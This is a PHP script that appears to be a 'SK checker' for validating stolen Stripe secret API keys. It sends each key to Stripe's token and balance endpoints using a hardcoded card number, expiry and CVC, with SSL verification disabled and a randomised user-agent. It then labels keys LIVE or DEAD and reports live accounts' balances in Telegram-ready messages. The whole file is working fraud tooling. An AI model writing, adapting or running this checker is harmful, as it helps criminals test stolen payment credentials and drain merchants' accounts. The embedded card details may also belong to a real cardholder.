<?php
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

require "./function.php";

$sk="";
if(isset($_GET['sk'])){
    $sk = $_GET['sk'];
}

############[1 Req]#############

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));
$r1 = curl_exec($ch);
$msg = trim(strip_tags(getstr($r1,'"message": "','"')));

############[2 Req]#############

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$r2 = curl_exec($ch);
$curr = Getstr($r2,'"currency": "','"');
$balance = trim(strip_tags(getStr($r2,'{
  "object": "balance",
  "available": [
    {
      "amount":',',')));
      $pending = trim(strip_tags(getStr($r2,'"livemode": true,
      "pending": [
        {
          "amount":',',')));

#############[Responses]#############

if ((strpos($r1, 'rate_limit')) || (strpos($r1, 'rate_limit'))){
  echo "<b>#RATE-LIMIT : $sk
  <br>RESPONSE:  RATE LIMIT ⚠️
  <br>BALANCE: $balance
  <br>CURRENCY: $curr</b>";
  $tg2 =
  "✅ SK LIVE
#LIVE : <code>".$sk."</code>
RESPONSE : RATE LIMIT ⚠️
BALANCE : $balance 
CURRENCY : $curr";
}
  elseif ((strpos($r1, 'tok_')) || (strpos($r1, 'tok'))){
    echo "<b>#LIVE : $sk
  <br>RESPONSE: VALID LIVE SK KEY✅
  <br>BALANCE: $balance
  <br>CURRENCY: $curr</b>";
  $tg2 = 
  "✅ SK LIVE
#LIVE : <code>".$sk."</code>
RESPONSE : VALID LIVE SK KEY ✅
BALANCE : $balance
CURRENCY : $curr";
}      
elseif(strpos($r1, "api_key_expired" )) {
  echo "<b>DEAD : $sk
  <br>RESPONSE: API KEY REVOKED ❌</b>";
}
elseif(strpos($r1, "Invalid API Key provided" )) {
 echo "<b>DEAD : $sk
 <br>RESPONSE: INVALID API KEY ❌</b>";
}
elseif(strpos($r1, "testmode_charges_only" )) {
  echo "<b>DEAD : $sk
  <br>RESPONSE: TESTMODE CHARGES ONLY ❌</b>";
}
elseif(strpos($r1, "Your card was declined" )) {
  echo "<b>#LIVE : $sk
  <br>RESPONSE: VALID LIVE SK KEY✅
  <br>BALANCE: $balance
  <br>CURRENCY: $curr</b>";
  $tg2 = 
  "✅ SK LIVE
#LIVE : <code>".$sk."</code>
RESPONSE : VALID LIVE SK KEY ✅
BALANCE : $balance
CURRENCY : $curr";
}
else {
echo "<b>DEAD: $sk
<br>RESPONSE: $msg ❌</b>";
}
curl_close($ch);
ob_flush();

?>
